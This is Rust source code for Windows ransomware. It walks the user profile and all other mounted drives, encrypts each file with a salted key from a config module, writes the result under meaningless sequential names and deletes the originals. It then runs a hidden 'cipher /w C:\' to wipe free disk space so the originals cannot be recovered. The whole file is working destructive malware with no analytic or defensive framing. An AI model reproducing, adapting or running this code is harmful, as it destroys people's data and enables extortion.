use std::path::PathBuf;
use std::process::Command;
use std::os::windows::process::CommandExt;
use std::sync::Mutex;
use std::{env, fs};

mod config;

static COUNTER: Mutex<String> = Mutex::new(String::new());

fn main() {
    let drives = get_drives();
    let files = get_files(&drives);

    for file in files.iter().rev() {
        process_file(&file);
    }

    Command::new("cipher")
        .arg("/w")
        .arg("C:\\")
        .creation_flags(0x08000000)
        .spawn()
        .unwrap();
}

fn get_files(drives: &Vec<PathBuf>) -> Vec<PathBuf> {
    drives.iter()
        .flat_map(|a| lib::file::get_files(a))
        .collect()
}

fn get_drives() -> Vec<PathBuf> {
    let mut drives = Vec::new();

    let main_drive = env::var("SYSTEMDRIVE")
        .unwrap_or("C:".to_string());

    let user_profile = env::var("USERPROFILE").unwrap();

    drives.push(PathBuf::from(user_profile));

    for letter in b'A'..=b'Z' {
        let drive = format!("{}:\\", letter as char);
        let path = PathBuf::from(&drive);

        if drive.starts_with(&main_drive) {
            continue;
        }

        if path.metadata().is_ok() {
            drives.push(path);
        }
    }

    drives
}

fn process_file(file: &PathBuf) {
    let contents = fs::read(&file);
    let the_contents = match contents {
        Ok(res) => res,
        Err(_) => return
    };

    let name = file.file_stem()
        .and_then(|a| a.to_str())
        .unwrap_or("")
        .as_bytes();

    let extension = file.extension()
        .and_then(|a| a.to_str())
        .unwrap_or("")
        .as_bytes();

    let salt = lib::random::gen_vec(32);
    let key = lib::hash::hash_key(config::KEY, &salt);

    let mut to_encrypt = Vec::new();
    to_encrypt.extend_from_slice(&the_contents);
    to_encrypt.extend_from_slice(&salt);
    to_encrypt.extend_from_slice(name);
    to_encrypt.extend_from_slice(extension);

    let encrypted_contents = lib::crypto::encrypt(&to_encrypt, &key);

    let metadata = format!(".{}.{}", name.len(), extension.len());

    let mut to_write = Vec::new();
    to_write.extend_from_slice(&encrypted_contents);
    to_write.extend_from_slice(&salt);
    to_write.extend_from_slice(metadata.as_bytes());

    let parent = file
        .parent()
        .unwrap();

    let new_file = parent.join(get_new_name());

    match fs::write(new_file, to_write) {
        Ok(_) => {},
        Err(_) => return
    }

    lib::file::delete_file(file);

    if config::DEBUG {
        println!("done encryption for - {}", file.display());
    }
}

fn get_new_name() -> String {
    let mut counter = COUNTER
        .lock()
        .unwrap();

    if counter.is_empty() {
        *counter = String::from("a");
        return counter.clone();
    }

    let mut chars = counter
        .chars()
        .collect::<Vec<char>>();

    let mut idx = chars.len() - 1;

    loop {
        if chars[idx] == 'z' {
            chars[idx] = 'a';

            if idx == 0 {
                chars.insert(0, 'a');
                break;
            }

            idx -= 1;
        } else {
            chars[idx] = (chars[idx] as u8 + 1) as char;
            break;
        }
    }

    *counter = chars
        .into_iter()
        .collect();

    counter.clone()
}